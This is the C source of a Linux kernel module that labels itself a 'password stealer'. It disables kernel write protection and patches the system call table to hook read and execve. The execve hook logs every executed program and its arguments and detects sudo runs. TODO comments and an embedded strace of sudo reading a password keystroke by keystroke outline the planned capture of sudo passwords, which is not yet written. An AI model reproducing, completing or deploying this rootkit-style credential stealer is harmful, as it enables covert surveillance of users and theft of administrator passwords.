#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>


#include <linux/binfmts.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("SourceCodeDeleted");

// Special thanks to sticksxo

MODULE_DESCRIPTION("Simple Hooking Password Stealer Syscall");
MODULE_VERSION("1.0");


unsigned long **SYS_CALL_TABLE;


void EnablePageWriting(void){
	write_cr0(read_cr0() & (~0x10000));

} 
void DisablePageWriting(void){
	write_cr0(read_cr0() | 0x10000);

} 

// EXECVE STRACE

/*
# sudo  strace -u myusername  sudo -k pwd
execve("/bin/ls", ["ls", "-l"], 0x7ffc804d9e98 ) = 0
execve("/usr/bin/sudo", ["sudo", "-k", "pwd"], 0x7ffdff5fec50  24 vars ) = 0
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
...
...
...
write(4, "[sudo] password for myusername: ", 27[sudo] password for myusername: ) = 27
write(4, "*", 1*)                        = 1
read(4, "s", 1)                         = 1
write(4, "*", 1*)                        = 1
read(4, "d", 1)                         = 1
write(4, "*", 1*)                        = 1
read(4, "d", 1)                         = 1
write(4, "*", 1*)                        = 1
read(4, "a", 1)                         = 1
write(4, "*", 1*)                        = 1
read(4, "s", 1)                         = 1
write(4, "*", 1*)                        = 1
read(4, "d", 1)                         = 1
write(4, "*", 1*)                        = 1
read(4, "\n", 1)                        = 1
write(4, "\10 \10", )                  = 3
write(4, "\10 \10", )                  = 3
write(4, "\10 \10", )                  = 3
write(4, "\10 \10", )                  = 3
write(4, "\10 \10", )                  = 3
write(4, "\10 \10", )                  = 3
write(4, "\10 \10", )                  = 3
write(4, "\10 \10", )                  = 3
alarm(0)                                = 0
write(4, "\n", 1
)                       = 1
...
...
...
openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 4
*/
/*
Table 1. The User Space Memory Access API
Function	Description
access_ok	Checks the validity of the user space memory pointer
get_user	Gets a simple variable from user space
put_user	Puts a simple variable to user space
clear_user	Clears, or zeros, a block in user space
copy_to_user	Copies a block of data from the kernel to user space
copy_from_user	Copies a block of data from user space to the kernel
strnlen_user	Gets the size of a string buffer in user space
strncpy_from_user	Copies a string from user space into the kernel
*/


char char_buffer[255] = {0};
// Note: Do not name variables similar, especially globals.
// The argc <-> argz <-> argv differ only in one char.
// and 2d array to hold arguments strings
char argz[255][255] = {0};
// the count of arguments
size_t argc = 0;


char CharBuffer [255] = {'\0'};
char Argz       [255] = {'\0'};;




/* from: /usr/src/linux-headers-$(uname -r)/include/linux/syscalls.h */
asmlinkage int (*origional_execve)(const char *filename, char *const argv[], char *const envp[]);
asmlinkage int HookExecve(const char *filename, char *const argv[], char *const envp[]) {

      copy_from_user(&CharBuffer , filename , strnlen_user(filename , sizeof(CharBuffer) - 1  ) );
      printk( KERN_INFO "Executable Name %s  \n", CharBuffer );

			char * ptr = 0xF00D; 

      // Since we don't know the count of args we go until the 0 arg.
      // We will collect 20 args maximum. 
      // 
	int i;	
		for (i = 0 ; i < 20 ; i++){ 
        if(ptr){
         int success =  copy_from_user(&ptr, &argv[i], sizeof(ptr));
         // Check for ptr being 0x00 
         if(success == 0 && ptr){
            //printk( KERN_INFO "Pointer Name %px  \n", ptr );
            strncpy_from_user(Argz, ptr , sizeof(Argz));
            printk( KERN_INFO "Args  %s  \n", Argz );
            memset(Argz, 0 ,sizeof(Argz));

         }
    }
}
        // We need to check if SUDO is called.
        if(   strcmp(CharBuffer , "/usr/bin/sudo" ) == 0   ){
            printk( KERN_INFO "Sudo Executed! ");

        }






  return (*origional_execve)(filename, argv, envp);
}



//TODO   ssize_t write(int fd, const void *buf, size_t count);
// TODO  check if write syscall containes the following:
// TODO  "[sudo] password for"




asmlinkage int (*original_read)(unsigned int, void __user*, size_t);
asmlinkage int  HookRead(unsigned int fd, void __user* buf, size_t count) {
	//printk(KERN_INFO "READ HOOKED HERE! -- This is our function!");

  //TODO Read if buffer one byte until byte == \n

	return (*original_read)(fd, buf, count);
}






static int __init SetHooks(void) {
	// Gets Syscall Table **
 	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); 

	printk(KERN_INFO "Hooks Will Be Set.\n");
	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);


	EnablePageWriting();

    // Replaces Pointer Of Syscall_read on our syscall.
	


	// KEEP THIS ORDER!!! 
	// CRASH WILL HAPPEN
	original_read = (void*)SYS_CALL_TABLE[__NR_read];
	SYS_CALL_TABLE[__NR_read] = (unsigned long*)HookRead;

	origional_execve = (void*)SYS_CALL_TABLE[__NR_execve];
	SYS_CALL_TABLE[__NR_execve] = (unsigned long*)HookExecve;
	
	DisablePageWriting();

	return 0;
}







static void __exit HookCleanup(void) {

	// Clean up our Hooks
	EnablePageWriting();
	SYS_CALL_TABLE[__NR_read]   = (unsigned long*)original_read;
	SYS_CALL_TABLE[__NR_execve] = (unsigned long*)origional_execve;
	DisablePageWriting();

	printk(KERN_INFO "HooksCleaned Up!");
}

module_init(SetHooks);
module_exit(HookCleanup);
